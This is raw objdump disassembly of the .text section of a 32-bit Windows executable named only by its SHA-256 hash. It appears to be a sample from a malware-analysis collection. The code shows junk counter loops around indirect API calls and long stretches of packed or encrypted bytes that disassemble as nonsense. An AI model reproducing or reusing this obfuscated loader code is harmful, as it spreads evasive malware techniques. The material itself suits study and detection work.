
925845aaafd5a01159a6cf79fce464668055e4663cb91f243404b40a8646885b.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x98
  401009:	mov    DWORD PTR ds:0x433697,0x1c
  401013:	cmp    DWORD PTR ds:0x433697,0x0
  40101a:	je     0x40106d
  401020:	cmp    DWORD PTR ds:0x433697,0x6
  401027:	jne    0x401040
  40102d:	push   0x8196
  401032:	push   DWORD PTR [ebp-0xc]
  401035:	push   0x6434
  40103a:	call   DWORD PTR ds:0x412268
  401040:	cmp    DWORD PTR ds:0x433697,0x7
  401047:	jne    0x40105b
  40104d:	xor    eax,eax
  40104f:	xor    eax,DWORD PTR ds:0x433697
  401055:	dec    eax
  401056:	mov    ds:0x433697,eax
  40105b:	mov    eax,ds:0x433697
  401060:	dec    eax
  401061:	mov    ds:0x433697,eax
  401066:	jmp    0x401013
  40106b:	or     ecx,eax
  40106d:	mov    eax,ds:0x413b34
  401072:	mov    DWORD PTR [ebp-0x18],eax
  401075:	sub    DWORD PTR ds:0x43369b,0x1705
  40107f:	mov    eax,ds:0x413c44
  401084:	sub    DWORD PTR ds:0x43369f,edx
  40108a:	mov    DWORD PTR [ebp-0x48],eax
  40108d:	xor    eax,ecx
  40108f:	mov    DWORD PTR [ebp-0x10],0xf89c8531
  401096:	add    eax,DWORD PTR ds:0x4336d3
  40109c:	mov    DWORD PTR [ebp-0x1c],0xf89c8532
  4010a3:	sbb    eax,eax
  4010a5:	mov    eax,DWORD PTR [ebp-0x10]
  4010a8:	push   ebx
  4010a9:	movzx  ebx,BYTE PTR ds:0x4336af
  4010b0:	sbb    ebx,DWORD PTR ds:0x433693
  4010b6:	mov    DWORD PTR ds:0x4336af,ebx
  4010bc:	push   esi
  4010bd:	mov    esi,0x7510854
  4010c2:	xor    eax,esi
  4010c4:	push   edi
  4010c5:	or     ecx,ebx
  4010c7:	mov    edi,0x32729b
  4010cc:	add    eax,edi
  4010ce:	and    DWORD PTR ds:0x43372b,0x264c
  4010d8:	mov    DWORD PTR [ebp-0x38],eax
  4010db:	mov    DWORD PTR ds:0x4336af,0x18
  4010e5:	cmp    DWORD PTR ds:0x4336af,0x0
  4010ec:	je     0x401146
  4010f2:	cmp    DWORD PTR ds:0x4336af,0xc
  4010f9:	jne    0x401108
  4010ff:	push   DWORD PTR [ebp-0x24]
  401102:	call   DWORD PTR ds:0x4120b4
  401108:	cmp    DWORD PTR ds:0x4336af,0xd
  40110f:	jne    0x401122
  401115:	mov    ebx,DWORD PTR ds:0x4336af
  40111b:	dec    ebx
  40111c:	mov    DWORD PTR ds:0x4336af,ebx
  401122:	xor    ebx,ebx
  401124:	add    ebx,DWORD PTR ds:0x4336af
  40112a:	dec    ebx
  40112b:	mov    DWORD PTR ds:0x4336af,ebx
  401131:	jmp    0x4010e5
  401136:	mov    ecx,DWORD PTR ds:0x433677
  40113c:	mov    eax,ds:0x433733
  401141:	sub    ecx,eax
  401143:	add    ecx,DWORD PTR [ecx+eax*1]
  401146:	mov    DWORD PTR [ebp-0x44],0xf89cb531
  40114d:	mov    DWORD PTR [ebp-0x54],0xf89f0531
  401154:	mov    DWORD PTR [ebp-0x4c],0xf89c85f1
  40115b:	or     DWORD PTR ds:0x43371b,0x1296
  401165:	mov    DWORD PTR [ebp-0x3c],0xf89c85d1
  40116c:	mov    eax,DWORD PTR [ebp-0x10]
  40116f:	sub    DWORD PTR ds:0x4335ff,0x1011
  401179:	xor    eax,esi
  40117b:	add    eax,edi
  40117d:	mov    DWORD PTR [ebp-0xc],eax
  401180:	sbb    DWORD PTR ds:0x43361f,0x6b1e
  40118a:	mov    DWORD PTR [ebp-0x28],0xf89c853e
  401191:	mov    BYTE PTR [ebp-0x11],0x67
  401195:	mov    eax,DWORD PTR [ebp-0x10]
  401198:	xor    DWORD PTR ds:0x43365b,0x46ad
  4011a2:	xor    eax,esi
  4011a4:	add    eax,edi
  4011a6:	jmp    0x401347
  4011ab:	jb     0x401145
  4011ad:	fsub   DWORD PTR [edx]
  4011af:	lock bound esi,QWORD PTR [eax+0x68]
  4011b3:	push   ecx
  4011b4:	in     al,0x70
  4011b6:	or     dl,bh
  4011b8:	out    dx,al
  4011b9:	aaa    
  4011ba:	jmp    0x7ebe903d
  4011bf:	cli    
  4011c0:	jg     0x401240
  4011c2:	jle    0x401192
  4011c4:	xlat   BYTE PTR ds:[ebx]
  4011c5:	cmp    eax,0xcfd339d5
  4011ca:	rol    edx,1
  4011cc:	pop    es
  4011cd:	add    al,0x3
  4011cf:	add    DWORD PTR ds:0xf330f00,ebp
  4011d5:	rcr    BYTE PTR [eax],0xc7
  4011d8:	adc    BYTE PTR [edi],bl
  4011da:	mov    ecx,0xddb70058
  4011df:	push   cs
  4011e0:	out    dx,eax
  4011e1:	mov    ebp,0x8e03d6db
  4011e6:	es mov esi,0x1541a2f4
  4011ec:	lods   eax,DWORD PTR ds:[esi]
  4011ed:	fiadd  WORD PTR [esi+0x1f]
  4011f0:	data16 in al,dx
  4011f2:	outs   dx,DWORD PTR ds:[esi]
  4011f3:	or     edx,DWORD PTR [ecx]
  4011f5:	pushf  
  4011f6:	js     0x4011ce
  4011f8:	inc    eax
  4011f9:	stos   BYTE PTR es:[edi],al
  4011fa:	push   ebx
  4011fb:	sub    eax,0xad3cc4d1
  401200:	mov    bh,BYTE PTR [ebx-0x3b]
  401203:	stos   DWORD PTR es:[edi],eax
  401204:	push   es
  401205:	(bad)  
  401206:	rol    DWORD PTR [ecx+0x3990d6f9],cl
  40120c:	jmp    0x40123e
  40120e:	mov    ebp,ecx
  401210:	dec    edi
  401211:	out    0xa6,al
  401213:	inc    ecx
  401214:	call   DWORD PTR [edi-0x2556f868]
  40121a:	mov    ebp,0x5536ed4d
  40121f:	and    esi,DWORD PTR [edx-0x43619116]
  401225:	jnp    0x401238
  401227:	ret    
  401228:	xchg   edx,eax
  401229:	and    esp,edx
  40122b:	jmp    0x40128b
  40122d:	ret    0xb8e4
  401230:	lock jmp 0xd765:0x74cf3192
  401238:	and    ch,cl
  40123a:	add    bl,cl
  40123c:	adc    DWORD PTR [ecx-0x5a],edx
  40123f:	xor    eax,0x78616f03
  401244:	or     BYTE PTR [ecx],dh
  401246:	fisttp QWORD PTR [esi+0x7f752854]
  40124c:	(bad)
  401251:	or     ebx,DWORD PTR [ebx+0x55]
  401254:	fst    st(6)
  401256:	or     ebx,edx
  401258:	pop    esp
  401259:	fstp   DWORD PTR [ecx]
  40125b:	jno    0x4011fb
  40125d:	inc    esi
  40125e:	dec    ebx
  40125f:	aaa    
  401260:	adc    eax,0x1a29772b
  401265:	sar    DWORD PTR [esi],cl
  401267:	dec    edi
  401268:	call   0x1240b73a
  40126d:	sti    
  40126e:	test   BYTE PTR [ebp+0x5],0x2d
  401272:	jge    0x401297
  401274:	sub    edx,eax
  401276:	sbb    al,bl
  401278:	push   esp
  401279:	sbb    ah,bh
  40127b:	inc    edi
  40127c:	fcmovb st,st(5)
  40127e:	call   DWORD PTR [ecx-0x7f]
  401281:	in     al,dx
  401282:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401283:	xor    DWORD PTR [ecx+eiz*8-0x61abe667],edx
  40128a:	and    al,0x9a
  40128c:	mov    ch,bl
  40128e:	mov    BYTE PTR [edi+0x1d],cl
  401291:	inc    edx
  401292:	ja     0x40124a
  401294:	add    DWORD PTR [edi-0xde5da83],edx
  40129a:	jmp    0x431ff5d2
  40129f:	ins    DWORD PTR es:[edi],dx
  4012a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4012a1:	inc    esp
  4012a2:	pop    ecx
  4012a3:	enter  0xa3ea,0xbb
  4012a7:	fcomp  DWORD PTR [ecx]
  4012a9:	pop    ds
  4012aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4012ab:	cmp    DWORD PTR [ebp+ebx*4+0x5a],edx
  4012af:	pop    ecx
  4012b0:	inc    esi
  4012b1:	dec    ebp
  4012b2:	aad    0x58
  4012b4:	lahf   
  4012b5:	cmp    BYTE PTR [edi],ch
  4012b7:	cmp    al,0x78
  4012b9:	jo     0x401304
  4012bb:	adc    bh,BYTE PTR [esi]
  4012bd:	ss mov ch,0xf8
  4012c0:	xor    dl,BYTE PTR [esi+ebp*8-0x1a]
  4012c4:	or     dl,BYTE PTR [esi+esi*1+0x32]
  4012c8:	leave  
  4012c9:	push   eax
  4012ca:	bound  ecx,QWORD PTR [ecx-0x41]
  4012cd:	jl     0x4012e4
  4012cf:	gs data16 cmp al,0x65
  4012d3:	cmp    BYTE PTR [ecx-0x18],bl
  4012d6:	cmp    esi,edi
  4012d8:	lahf   
  4012d9:	fs es test eax,0xfa3b4309
  4012e0:	sub    ebp,DWORD PTR [edi]
  4012e2:	push   eax
  4012e3:	dec    eax
  4012e4:	fmul   st,st(3)
  4012e6:	mov    ch,0xfd
  4012e8:	iret   
  4012e9:	mov    dh,BYTE PTR [ebx+0xb428c9c]
  4012ef:	stc    
  4012f0:	push   ecx
  4012f1:	pop    ecx
  4012f2:	popf   
  4012f3:	clc    
  4012f4:	ins    BYTE PTR es:[edi],dx
  4012f5:	mov    eax,ds:0xc313e898
  4012fa:	pop    ebx
  4012fb:	mov    dh,0x18
  4012fd:	xchg   ebp,eax
  4012fe:	imul   BYTE PTR [ebp-0x35]
  401301:	push   ebx
  401302:	jo     0x4012e8
  401304:	repz add al,0xb1
  401307:	add    eax,ebp
  401309:	stos   DWORD PTR es:[edi],eax
  40130a:	add    ecx,DWORD PTR [ecx]
  40130c:	sti    
  40130d:	mov    cl,0xa0
  40130f:	lods   al,BYTE PTR ds:[esi]
  401310:	(bad)  
  401311:	pushf  
  401312:	push   ebx
  401313:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401314:	push   esi
  401315:	pop    ds
  401316:	shl    dl,1
  401318:	dec    edi
  401319:	xchg   ebx,eax
  40131a:	mov    dl,0x1a
  40131c:	xor    eax,0x956c22aa
  401321:	mov    DWORD PTR [esi+0x4b],edi
  401324:	add    cl,BYTE PTR [ebp+0x734a51d9]
  40132a:	pop    ds
  40132b:	mov    ds:0xed921ca4,al
  401330:	call   0x887b:0x77cdd2d9
  401337:	push   ebp
  401338:	inc    DWORD PTR [eax-0x17]
  40133b:	clts   
  40133d:	pop    edx
  40133e:	ret    
  40133f:	(bad)  
  401341:	sub    dh,BYTE PTR [edx]
  401343:	mov    dl,0xb
  401345:	pop    edi
  401346:	outs   dx,BYTE PTR ds:[esi]
  401347:	mov    DWORD PTR [ebp-0xc],eax
  40134a:	and    DWORD PTR ds:0x433653,0x0
  401354:	jmp    0x401366
  401359:	mov    ebx,DWORD PTR ds:0x433653
  40135f:	inc    ebx
  401360:	mov    DWORD PTR ds:0x433653,ebx
  401366:	cmp    DWORD PTR ds:0x433653,0x10
  40136d:	jae    0x401543
  401373:	cmp    DWORD PTR ds:0x433653,0x12
  40137a:	jne    0x401393
  401380:	push   0x3bad
  401385:	push   0x706b
  40138a:	push   DWORD PTR [ebp-0x20]
  40138d:	call   DWORD PTR ds:0x412284
  401393:	jmp    0x401359
  401398:	or     DWORD PTR ds:0x43360b,0x4335ff
  4013a2:	jmp    0x401543
  4013a7:	dec    ebp
  4013a8:	push   0xb1638b43
  4013ad:	push   ebp
  4013ae:	push   0xd91cd24
  4013b3:	inc    edx
  4013b4:	pop    ecx
  4013b5:	in     eax,dx
  4013b6:	jo     0x4013b2
  4013b8:	jg     0x401438
  4013ba:	jle    0x4013b6
  4013bc:	jg     0x40143c
  4013be:	jle    0x40142c
  4013c0:	dec    edx
  4013c1:	loope  0x401411
  4013c3:	sub    BYTE PTR [ebx],0x3b
  4013c6:	jge    0x4013bb
  4013c8:	ficom  WORD PTR [ebx-0x74]
  4013cb:	and    cl,BYTE PTR [edx-0x6a695423]
  4013d1:	adc    DWORD PTR [ebx+0x2f],ebx
  4013d4:	mov    eax,ds:0xde5f02cd
  4013d9:	mov    eax,?
  4013db:	adc    BYTE PTR [eax+0x78da6674],ah
  4013e1:	jecxz  0x4013ca
  4013e3:	mov    esp,0x9c49bd9
  4013e8:	xchg   esi,eax
  4013e9:	das    
  4013ea:	ds loop 0x401405
  4013ed:	mov    bh,0xc0
  4013ef:	dec    ebx
  4013f0:	mov    ch,0x5d
  4013f2:	cs cmc 
  4013f4:	enter  0x8a5c,0xaa
  4013f8:	jae    0x4013c8
  4013fa:	pusha  
  4013fb:	ja     0x40146c
  4013fd:	pop    ecx
  4013fe:	dec    ebx
  4013ff:	ja     0x40141c
  401401:	popa   
  401402:	ja     0x401405
  401404:	repnz leave 
  401406:	stc    
  401407:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401408:	out    0x16,eax
  40140a:	jmp    0x1f7c:0x14f62f19
  401411:	into   
  401412:	mov    al,ds:0xafb78746
  401417:	outs   dx,DWORD PTR ds:[esi]
  401418:	gs (bad) 
  40141a:	jecxz  0x401479
  40141c:	jne    0x40140a
  40141e:	sbb    BYTE PTR [edi-0x1e],cl
  401421:	mov    WORD PTR [ecx-0xc],?
  401424:	push   0x84184121
  401429:	xchg   ebx,eax
  40142a:	stos   DWORD PTR es:[edi],eax
  40142b:	idiv   BYTE PTR [esi]
  40142d:	sub    dh,0x8c
  401430:	push   0xffffff81
  401432:	adc    DWORD PTR [edi-0x14],edi
  401435:	repz add DWORD PTR [edi],ecx
  401438:	retf   0xab6d
  40143b:	popf   
  40143c:	xchg   ebp,eax
  40143d:	sbb    edi,DWORD PTR ds:0x4b138e6
  401443:	mov    bl,0xd0
  401445:	adc    eax,0xda61a962
  40144a:	cmc    
  40144b:	outs   dx,DWORD PTR ds:[esi]
  40144c:	xchg   ebx,ebx
  40144e:	mov    cl,0x67
  401450:	sbb    esp,0xffffffe2
  401453:	push   es
  401454:	push   0x9bc8699a
  401459:	aad    0xae
  40145b:	jmp    0x4013ed
  40145d:	ss fs call 0xeac9:0x4adc179c
  401466:	rcr    DWORD PTR [ecx+eiz*8+0x538da9d7],0xe1
  40146e:	and    BYTE PTR [esp+ebx*1+0x604b9ba3],bl
  401475:	add    al,0xef
  401477:	mov    ebp,0x7eca7d77
  40147c:	es jb  0x4014cf
  40147f:	adc    ebp,DWORD PTR [ecx-0x75]
  401482:	mov    DWORD PTR ss:[esi+0x3dc32ea3],ecx
  401489:	jbe    0x401508
  40148b:	sub    BYTE PTR ds:0xb3aafe91,ch
  401491:	sub    esp,DWORD PTR [edi]
  401493:	daa    
  401494:	ficom  WORD PTR [eax]
  401496:	scas   eax,DWORD PTR es:[edi]
  401497:	sbb    DWORD PTR ds:0x27d3a884,edi
  40149d:	nop
  40149e:	push   esi
  40149f:	ss sub ah,dh
  4014a2:	sub    bl,BYTE PTR [ebp+eax*1-0x3aff3e9f]
  4014a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014aa:	pop    edx
  4014ab:	in     al,dx
  4014ac:	inc    esp
  4014ad:	cwde   
  4014ae:	push   esp
  4014af:	nop
  4014b0:	mov    ah,0x8b
  4014b2:	ror    BYTE PTR [esi-0x20],cl
  4014b5:	inc    esp
  4014b6:	jmp    FWORD PTR ds:0xb6f81819
  4014bc:	adc    BYTE PTR [ecx],al
  4014be:	cmp    BYTE PTR [edx+0x6d],dl
  4014c1:	scas   eax,DWORD PTR es:[edi]
  4014c2:	in     eax,dx
  4014c3:	fidivr WORD PTR fs:[esi]
  4014c6:	lods   al,BYTE PTR ds:[esi]
  4014c7:	jmp    0x992763df
  4014cc:	inc    esi
  4014cd:	ficom  WORD PTR [ecx]
  4014cf:	test   al,0x6
  4014d1:	mov    esi,es
  4014d3:	and    esi,eax
  4014d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4014d6:	xlat   BYTE PTR ds:[ebx]
  4014d7:	and    DWORD PTR [edi+0x6b91dea],edx
  4014dd:	dec    ecx
  4014de:	jb     0x401541
  4014e0:	ds into 
  4014e2:	jb     0x401552
  4014e4:	xchg   esi,eax
  4014e5:	add    al,0x99
  4014e7:	fld    QWORD PTR [edx+0x50]
  4014ea:	mov    dh,0x8f
  4014ec:	aaa    
  4014ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4014ee:	cmp    eax,0x57796db2
  4014f3:	push   eax
  4014f4:	pusha  
  4014f5:	xor    BYTE PTR ds:0x9f0d394,cl
  4014fb:	adc    esp,DWORD PTR [ebx-0x7b51f72e]
  401501:	sbb    ah,dl
  401503:	and    eax,0x26d13cc4
  401508:	xchg   edx,eax
  401509:	sub    eax,0xd4abaf5e
  40150e:	lods   al,BYTE PTR ds:[esi]
  40150f:	and    BYTE PTR [edx],bl
  401511:	iret   
  401512:	sti    
  401513:	jns    0x4014ca
  401515:	clc    
  401516:	pop    es
  401517:	lock mov edx,0xd2e4835a
  40151d:	pop    edi
  40151e:	call   0x2eb1:0x9fd8ecd1
  401525:	test   BYTE PTR [edi-0x3d8e712f],ah
  40152b:	sub    DWORD PTR [ecx-0x63],0x6838598f
  401532:	sub    al,0xde
  401534:	(bad)  
  401535:	sub    BYTE PTR [ebp+0x6d6f342b],bh
  40153b:	xchg   ecx,eax
  40153c:	lea    ebp,[edi]
  40153e:	jmp    0x15e79160
  401543:	mov    eax,DWORD PTR [ebp-0x3c]
  401546:	xor    DWORD PTR ds:0x43360f,ebx
  40154c:	xor    eax,esi
  40154e:	neg    ecx
  401550:	jmp    0x4016f1
  401555:	cli    
  401556:	fcomp  QWORD PTR [edx-0x4caea7e9]
  40155c:	jno    0x4014f6
  40155e:	cmp    ah,BYTE PTR [ebx-0x3672061d]
  401564:	and    al,BYTE PTR [esi]
  401566:	jge    0x4015e6
  401568:	jle    0x401564
  40156a:	jg     0x4015ea
  40156c:	jle    0x4015c4
  40156e:	mov    ch,0xc
  401570:	aas    
  401571:	ret    0xef7d
  401574:	in     al,0xb1
  401576:	inc    ebx
  401577:	in     al,0xc4
  401579:	scas   eax,DWORD PTR es:[edi]
  40157a:	pusha  
  40157b:	and    al,0x5f
  40157d:	lea    edx,[edx-0x3c197b41]
  401583:	xchg   ecx,eax
  401584:	xlat   BYTE PTR ds:[ebx]
  401585:	in     eax,0x73
  401587:	inc    edx
  401588:	sti    
  401589:	test   DWORD PTR [edi-0x2f367f63],ebx
  40158f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401590:	imul   edi,DWORD PTR [eax],0xffffffad
  401593:	push   edx
  401594:	jae    0x40155e
  401596:	loopne 0x401533
  401598:	jo     0x4015da
  40159a:	(bad)  
  40159b:	push   0x3
  40159d:	and    al,0xd0
  40159f:	loop   0x40160e
  4015a1:	xor    DWORD PTR [ebx-0x14b1e078],ebx
  4015a7:	jnp    0x4015da
  4015a9:	jp     0x4015dc
  4015ab:	jno    0x401618
  4015ad:	xchg   BYTE PTR ds:0xd07894f4,cl
  4015b3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4015b4:	fstp   DWORD PTR ds:0x5a0f5434
  4015ba:	in     al,dx
  4015bb:	mov    ebx,0xcc5b8449
  4015c0:	adc    edx,DWORD PTR [edi-0x60f98e9a]
  4015c6:	xor    DWORD PTR [edx],ebx
  4015c8:	xchg   ebx,eax
  4015c9:	cmp    BYTE PTR [ebp+ebx*8+0x40],cl
  4015cd:	inc    esi
  4015ce:	mov    ecx,0xc2c662b4
  4015d3:	mov    esp,0xf48a5a45
  4015d8:	xchg   esi,eax
  4015d9:	ds dec esp
  4015db:	test   BYTE PTR [ebx+0x5750987c],dl
  4015e1:	mov    ebx,esi
  4015e3:	jg     0x40160a
  4015e5:	add    esp,DWORD PTR [eax-0x6f]
  4015e8:	push   ecx
  4015e9:	sbb    bl,BYTE PTR [esi]
  4015eb:	test   BYTE PTR ds:0xc3c38ea4,0x22
  4015f2:	xchg   esp,eax
  4015f3:	ja     0x401610
  4015f5:	dec    ebp
  4015f6:	nop
  4015f7:	cld    
  4015f8:	pusha  
  4015f9:	inc    ebp
  4015fa:	pushf  
  4015fb:	imul   esi,edi,0x14
  4015fe:	or     dl,BYTE PTR [esi]
  401600:	sti    
  401601:	fwait
  401602:	(bad)  
  401603:	(bad)  [eax+0x6b787708]
  401609:	out    dx,al
  40160a:	stc    
  40160b:	push   0xffffff99
  40160d:	aaa    
  40160e:	repz (bad) [eax+0xf]
  401612:	dec    eax
  401613:	adc    DWORD PTR ds:0xdb04131b,esi
  401619:	adc    al,0x1e
  40161b:	xchg   esp,eax
  40161c:	inc    ebp
  40161d:	dec    edi
  40161e:	add    edx,ecx
  401620:	test   DWORD PTR [edi+0x18],ebx
  401623:	push   esi
  401624:	xchg   edi,eax
  401625:	cmp    al,0xe3
  401627:	test   al,0xda
  401629:	int    0x60
  40162b:	xlat   BYTE PTR ds:[ebx]
  40162c:	test   eax,0xf9abdc36
  401631:	aam    0x2a
  401633:	mov    eax,ds:0x4df17f6
  401638:	add    edx,DWORD PTR [eax+0x4ef2acfa]
  40163e:	leave  
  40163f:	mov    dh,0x82
  401641:	push   ebp
  401642:	div    BYTE PTR [ebx+edx*4]
  401645:	test   eax,0xb061643e
  40164a:	test   edi,esp
  40164c:	jno    0x401697
  40164e:	mov    eax,ds:0x7b387ef6
  401653:	sub    esi,DWORD PTR [ebx+0x70]
  401656:	mov    WORD PTR [esi+0x7d],ss
  401659:	mov    eax,0xb6723b04
  40165e:	out    0x5f,eax
  401660:	(bad)  
  401661:	push   cs
  401662:	stos   BYTE PTR es:[edi],al
  401663:	or     DWORD PTR [edi],esi
  401665:	ins    BYTE PTR es:[edi],dx
  401666:	fild   QWORD PTR [ebx-0x43]
  401669:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40166b:	xor    al,0xd4
  40166d:	sbb    esp,DWORD PTR [esi+edx*8+0x5129c757]
  401674:	jle    0x4016dd
  401676:	(bad)  
  401678:	(bad)  
  401679:	int3   
  40167a:	xlat   BYTE PTR ds:[ebx]
  40167b:	cmp    eax,0x2eb1e2
  401680:	out    0x3a,al
  401682:	data16 std 
  401684:	sbb    ebp,0xffffffd6
  401687:	jp     0x401674
  401689:	aaa    
  40168a:	rcr    bl,1
  40168c:	and    eax,0xbe785628
  401691:	fwait
  401692:	mov    bl,0x6c
  401694:	popf   
  401695:	jns    0x4016c9
  401697:	inc    edx
  401698:	pop    edx
  401699:	jge    0x4016c7
  40169b:	out    0x83,eax
  40169d:	dec    esp
  40169e:	xchg   esp,eax
  40169f:	rcl    DWORD PTR [edi],cl
  4016a1:	aas    
  4016a2:	xchg   esi,eax
  4016a3:	xor    DWORD PTR [ebp-0x5d],edx
  4016a6:	gs gs pop edi
  4016a9:	and    ebx,DWORD PTR [esi]
  4016ab:	push   ss
  4016ac:	ins    BYTE PTR es:[edi],dx
  4016ad:	cld    
  4016ae:	fisubr WORD PTR [ebx-0x3803f1e]
  4016b4:	in     al,dx
  4016b5:	clc    
  4016b6:	mov    DWORD PTR [ebp+0x2],0x9d145f4a
  4016bd:	outs   dx,DWORD PTR ds:[esi]
  4016be:	mov    eax,ds:0x4d37f88d
  4016c3:	mov    eax,0xc8b62f0c
  4016c8:	aaa    
  4016c9:	jle    0x401719
  4016cb:	popa   
  4016cc:	and    ah,BYTE PTR [eax]
  4016ce:	imul   ebp,DWORD PTR [esi],0x28cde079
  4016d4:	push   0x5dc05d4d
  4016d9:	push   ds
  4016da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016db:	jle    0x401678
  4016dd:	fldcw  WORD PTR [esi+0x6ffbd649]
  4016e3:	inc    edx
  4016e4:	mov    dh,0xe6
  4016e6:	retf   
  4016e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4016e8:	pop    ecx
  4016e9:	int3   
  4016ea:	pop    es
  4016eb:	popa   
  4016ec:	push   edi
  4016ed:	pop    eax
  4016ee:	mov    edx,0xc703340e
  4016f3:	mov    DWORD PTR [ebp-0x34],eax
  4016f6:	mov    eax,DWORD PTR [ebp-0x44]
  4016f9:	xor    eax,esi
  4016fb:	sbb    ecx,ecx
  4016fd:	add    eax,edi
  4016ff:	mov    DWORD PTR [ebp-0x30],eax
  401702:	mov    eax,DWORD PTR [ebp-0x28]
  401705:	and    DWORD PTR ds:0x4336df,0x0
  40170f:	jmp    0x401721
  401714:	mov    ebx,DWORD PTR ds:0x4336df
  40171a:	inc    ebx
  40171b:	mov    DWORD PTR ds:0x4336df,ebx
  401721:	cmp    DWORD PTR ds:0x4336df,0x18
  401728:	jae    0x40176c
  40172e:	cmp    DWORD PTR ds:0x4336df,0xa
  401735:	jne    0x40174b
  40173b:	push   0x7b82
  401740:	push   0x1a57
  401745:	call   DWORD PTR ds:0x41226c
  40174b:	cmp    DWORD PTR ds:0x4336df,0x9
  401752:	jne    0x401767
  401758:	xor    ebx,ebx
  40175a:	xor    ebx,DWORD PTR ds:0x4336df
  401760:	inc    ebx
  401761:	mov    DWORD PTR ds:0x4336df,ebx
  401767:	jmp    0x401714
  40176c:	xor    eax,esi
  40176e:	sbb    DWORD PTR ds:0x433603,0x47a9
  401778:	add    eax,edi
  40177a:	dec    DWORD PTR ds:0x433617
  401780:	mov    DWORD PTR [ebp-0x2c],eax
  401783:	lea    eax,[ebp-0x98]
  401789:	mov    DWORD PTR [ebp-0x8],eax
  40178c:	movzx  ecx,WORD PTR ds:0x43360b
  401793:	and    ecx,DWORD PTR ds:0x43365b
  401799:	mov    DWORD PTR ds:0x43360b,ecx
  40179f:	mov    eax,DWORD PTR [ebp-0x10]
  4017a2:	mov    DWORD PTR [ebp-0x24],eax
  4017a5:	and    DWORD PTR ds:0x43372f,0x0
  4017af:	jmp    0x4017c3
  4017b4:	xor    ebx,ebx
  4017b6:	or     ebx,DWORD PTR ds:0x43372f
  4017bc:	inc    ebx
  4017bd:	mov    DWORD PTR ds:0x43372f,ebx
  4017c3:	cmp    DWORD PTR ds:0x43372f,0x1c
  4017ca:	jae    0x40184e
  4017d0:	cmp    DWORD PTR ds:0x43372f,0x11
  4017d7:	jne    0x4017f0
  4017dd:	push   DWORD PTR [ebp-0x14]
  4017e0:	push   0x35e4
  4017e5:	push   0x7b35
  4017ea:	call   DWORD PTR ds:0x412270
  4017f0:	cmp    DWORD PTR ds:0x43372f,0x10
  4017f7:	jne    0x40180a
  4017fd:	mov    ebx,DWORD PTR ds:0x43372f
  401803:	inc    ebx
  401804:	mov    DWORD PTR ds:0x43372f,ebx
  40180a:	jmp    0x4017b4
  40180f:	and    DWORD PTR ds:0x4336e3,0x0
  401819:	mov    eax,ds:0x4336e3
  40181e:	inc    eax
  40181f:	mov    ds:0x4336e3,eax
  401824:	cmp    DWORD PTR ds:0x4336e3,0x27
  40182b:	jne    0x401841
  401831:	push   0x1cc5
  401836:	push   0x433623
  40183b:	call   DWORD PTR ds:0x412338
  401841:	cmp    DWORD PTR ds:0x4336e3,0x1d
  401848:	jb     0x401819
  40184e:	mov    eax,DWORD PTR [ebp-0x1c]
  401851:	xor    ebx,DWORD PTR ds:0x43371f
  401857:	mov    DWORD PTR [ebp-0x20],eax
  40185a:	and    DWORD PTR ds:0x43372b,0x0
  401864:	jmp    0x401878
  401869:	xor    ecx,ecx
  40186b:	xor    ecx,DWORD PTR ds:0x43372b
  401871:	inc    ecx
  401872:	mov    DWORD PTR ds:0x43372b,ecx
  401878:	cmp    DWORD PTR ds:0x43372b,0x12
  40187f:	jae    0x4018d1
  401885:	cmp    DWORD PTR ds:0x43372b,0x4
  40188c:	jne    0x4018b2
  401892:	push   0x6e91
  401897:	push   DWORD PTR [ebp-0x10]
  40189a:	push   DWORD PTR [ebp-0x24]
  40189d:	push   0x5930
  4018a2:	push   0x63f1
  4018a7:	push   0x153a
  4018ac:	call   DWORD PTR ds:0x412274
  4018b2:	cmp    DWORD PTR ds:0x43372b,0x3
  4018b9:	jne    0x4018cc
  4018bf:	mov    ecx,DWORD PTR ds:0x43372b
  4018c5:	inc    ecx
  4018c6:	mov    DWORD PTR ds:0x43372b,ecx
  4018cc:	jmp    0x401869
  4018d1:	mov    ebx,0xf89c853d
  4018d6:	jmp    0x401a77
  4018db:	or     ecx,esi
  4018dd:	out    0x8,al
  4018df:	jecxz  0x401911
  4018e1:	icebp  
  4018e2:	int    0x17
  4018e4:	add    eax,0x4b6a6ade
  4018e9:	dec    ebx
  4018ea:	push   esp
  4018eb:	cmp    BYTE PTR [edx+0x7e],0x7e
  4018ef:	cli    
  4018f0:	jg     0x401970
  4018f2:	jle    0x4018b3
  4018f4:	push   cs
  4018f5:	inc    BYTE PTR [ebx+0x23]
  4018f8:	(bad)  
  4018f9:	fisub  WORD PTR ds:0xbf6e2851
  4018ff:	nop
  401900:	ins    DWORD PTR es:[edi],dx
  401901:	push   esp
  401902:	push   ebp
  401903:	ret    0xe382
  401906:	imul   esp,esp,0xffffffd1
  401909:	inc    eax
  40190a:	jecxz  0x40192d
  40190c:	rcr    BYTE PTR gs:[ecx+0x4f],1
  401910:	mov    gs,WORD PTR [edi]
  401912:	jnp    0x4018fb
  401914:	ret    
  401915:	call   0xcab377c4
  40191a:	ins    DWORD PTR es:[edi],dx
  40191b:	xor    eax,0x31b5954b
  401920:	xor    esp,ebx
  401922:	dec    edx
  401923:	pusha  
  401924:	or     eax,esi
  401926:	mov    eax,ds:0xe6bed601
  40192b:	xchg   ebx,eax
  40192c:	mov    eax,ds:0xfcaab6fe
  401931:	cmp    eax,0x67429ca8
  401936:	lock sub al,0xc2
  401939:	and    eax,0x9dcaf381
  40193e:	mov    esp,0x570b46b7
  401943:	mov    cl,0x6b
  401945:	std    
  401946:	add    ebp,esi
  401948:	dec    di
  40194a:	rcr    BYTE PTR [ebx-0x4f],1
